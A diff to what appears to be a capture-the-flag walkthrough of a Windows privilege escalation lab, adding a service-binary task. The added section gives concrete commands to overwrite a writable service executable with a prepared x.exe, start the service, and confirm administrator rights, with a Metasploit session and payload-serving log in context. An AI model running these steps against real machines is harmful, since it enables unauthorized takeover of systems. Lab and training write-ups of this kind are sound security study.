@@ -123,7 +123,7 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Aut
 <br>
 <br>
 
-<p aling="center">Exploitation</p>
+<p align="center">Exploitation</p>
 
 ```bash
 :~/WindowsPrivEscArena# mfsconsole -q
@@ -224,6 +224,20 @@ xx.xxx.xx.xxx - - [28/Sep/2025 21:05:17] "GET /program.exe HTTP/1.1" 200 -
 <br>
 <br>
 <br>
+<h2 align="center">Task 4 . Registry Escalation - AlwaysInstallElevated</h2>
+<h3 align="center">Detection</h3>
+
+
+<h3 align="center">Exploitation</h3>
+
+<p><em>Answer the questions below</em></p>
+
+<p>4.1. Click 'Completed' once you have successfully elevated the machine<br>
+<code>No answer needed</code></p>
+
+<br>
+<br>
+<br>
 <h2 align="center">Task 5 . Service Escalation - Registry</h2>
 <h3 align="center">Detection</h3>
 
@@ -293,9 +307,29 @@ PS C:\Temp> net start regsvc
 
 <img width="985" height="552" alt="image" src="https://github.com/user-attachments/assets/aeb6d9e8-9cb2-42af-a0ec-1dc015d1e8dd" />
 
+
 <br>
 <br>
 <br>
+<h2 align="center">Task 6 . Service Escalation - Executable Files</h2>
+<h3 align="center">Detection</h3>
+
+<p>Windows VM<br>
+
+1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"<br>
+2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.</p>
+
+<h3 align="center">Exploitation</h3>
+<p>Windows VM<br>
+
+1. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"<br>
+2. In command prompt type: sc start filepermsvc<br>
+3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</p>
+
+<p><em>Answer the questions below</em></p>
+
+<p>6.1. Click 'Completed' once you have successfully elevated the machine<br>
+<code>No answer needed</code></p>
 
 
 <br>
